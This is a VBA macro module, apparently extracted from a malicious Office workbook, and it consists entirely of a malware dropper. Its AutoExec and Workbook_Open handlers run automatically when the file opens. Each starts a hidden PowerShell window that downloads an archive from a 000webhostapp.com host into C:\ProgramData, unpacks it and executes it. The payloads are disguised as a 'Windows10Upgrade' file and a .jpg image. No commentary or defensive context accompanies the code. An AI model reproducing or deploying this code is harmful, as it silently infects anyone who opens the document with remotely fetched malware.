Sub AutoExec()
 Dim x
 x = Shell("POWERSHELL.EXE " & "powershell -windowstyle hidden Invoke-WebRequest -uri 'https://unmeasurable-medici.000webhostapp.com/Windows10Upgrade9252.zip' -outfile 'C:\\ProgramData\\Windows10Upgrade9252.zip';Expand-Archive C:\\ProgramData\\Windows10Upgrade9252.zip -DestinationPath C:\\ProgramData\\; Start-Process 'C:\\ProgramData\\Windows10Upgrade9252.exe'")
End Sub



Sub Workbook_Open()
 Dim x
 x = Shell("POWERSHELL.EXE " & "powershell -windowstyle hidden Invoke-WebRequest -uri 'https://unmeasurable-medici.000webhostapp.com/0.jpg' -outfile 'C:\\ProgramData\\0.jpg';Expand-Archive C:\\ProgramData\\0.jpg -DestinationPath C:\\ProgramData\\; Start-Process 'C:\\ProgramData\\0.jpg'")
End Sub

